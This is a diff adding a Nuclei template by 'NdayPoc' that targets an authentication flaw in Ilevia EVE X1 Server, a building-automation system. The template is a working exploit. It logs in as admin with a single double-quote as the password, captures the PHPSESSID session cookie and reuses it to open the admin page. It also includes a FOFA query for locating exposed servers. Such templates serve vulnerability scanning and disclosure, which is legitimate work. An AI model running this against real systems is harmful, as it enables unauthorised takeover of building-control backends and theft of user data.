@@ -1,0 +1,48 @@
+id: ilevia-eve-x1-server-login-php-unauthorized-access
+
+info:
+  name: "Ilevia EVE X1 Server login.php 接口未授权获取会话ID漏洞"
+  author: NdayPoc
+  severity: high
+  description: |-
+    fofa: icon_hash="392278119"
+    Ilevia EVE X1 Server 的 login.php 接口存在身份认证缺陷，允许未授权用户通过特定 URL 获取在线用户的 sessionid。攻击者利用此漏洞可窃取用户敏感信息，并通过切换会话直接接管后台管理系统，导致严重的数据泄露及系统被恶意控制风险。
+  reference:
+  - https://mp.weixin.qq.com/s/hXPIZ2WYp-m2h5wy5bVxdg
+  tags: Ilevia EVE X1 Server
+
+flow: http(1) && http(2) 
+
+http:
+- raw:
+  - |
+    POST /login/login.php HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    userid=admin&passwd=%22&login=Login
+  extractors:
+  - type: regex
+    part: header
+    name: userToken
+    group: 1
+    regex:
+    - 'PHPSESSID=(.*?);'
+    internal: true
+- raw:
+  - |
+    GET /main/index.php HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: {{userToken}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'EVE X1 Server'
+    - 'ilevia - building automation'
+    - 'Setting'
+    condition: and
+  - type: status
+    status:
+    - 200
